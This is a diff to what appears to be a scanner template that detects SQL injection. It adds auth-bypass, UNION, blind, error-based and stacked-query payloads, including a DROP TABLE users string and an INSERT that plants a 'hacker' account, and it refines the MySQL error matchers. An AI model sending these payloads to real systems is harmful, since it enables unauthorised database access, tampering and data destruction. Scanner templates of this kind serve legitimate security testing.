@@ -24,21 +24,49 @@ http:
 
     payloads:
       injection:
+        # Authentication bypass
         - "' OR '1'='1"
         - "' OR '1'='1' --"
         - "' OR '1'='1' #"
-        - "admin' --"
-        - "admin' #"
         - "' OR 1=1 --"
         - "' OR 1=1 #"
+        - "admin' --"
+        - "admin' #"
         - "') OR ('1'='1"
         - "') OR ('1'='1' --"
+        - "' OR '1'='1' /*"
+        - "' OR 'a'='a"
+        - "' OR ''='"
+        - "'/**/OR/**/1=1"
+        # Union-based
         - "' UNION SELECT null,null,null --"
+        - "' UNION SELECT 1,2,3 --"
+        - "' UNION SELECT @@version,null,null --"
+        - "' UNION ALL SELECT null,null,null --"
+        # Time-based blind
         - "' AND SLEEP(5) --"
-        - "'; DROP TABLE users; --"
-        - "' OR EXISTS(SELECT * FROM users) --"
-        - "\\'OR\\'1\\'=\\'1"
+        - "' OR SLEEP(5) --"
+        - "' AND BENCHMARK(5000000,MD5('test')) --"
+        - "' OR IF(1=1, SLEEP(5), 0) --"
+        # Boolean-based blind
+        - "' AND '1'='1"
+        - "' AND '1'='2"
+        - "alice' AND '1'='1"
         - "alice' AND '1'='2"
+        - "' AND LENGTH(database())>0 --"
+        # Error-based
+        - "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
+        - "' AND extractvalue(1,concat(0x7e,@@version)) --"
+        - "' AND updatexml(1,concat(0x7e,@@version),1) --"
+        # Stacked queries
+        - "'; DROP TABLE users; --"
+        - "'; INSERT INTO users VALUES (99,'hacker','password'); --"
+        # Information gathering
+        - "' OR EXISTS(SELECT * FROM users) --"
+        - "' OR EXISTS(SELECT * FROM information_schema.tables) --"
+        # Double quotes
+        - "\" OR \"1\"=\"1"
+        - "\" OR \"1\"=\"1\" --"
 
     stop-at-first-match: true
     matchers-condition: or
@@ -52,11 +80,16 @@ http:
 
       - type: word
         words:
-          - "SQL syntax"
-          - "mysql error"
-          - "syntax error"
-          - "database error"
+          - "You have an error in your SQL syntax"
           - "MySQLSyntaxErrorException"
+          - "Column count doesn't match"
+          - "Unknown column"
+          - "Table.*doesn't exist"
+          - "Error 1064"
+          - "Error 1045"
+          - "Error 1105"
+          - "SQLSTATE[42000]"
+          - "SQLSTATE[HY000]"
         condition: or
         part: body
 
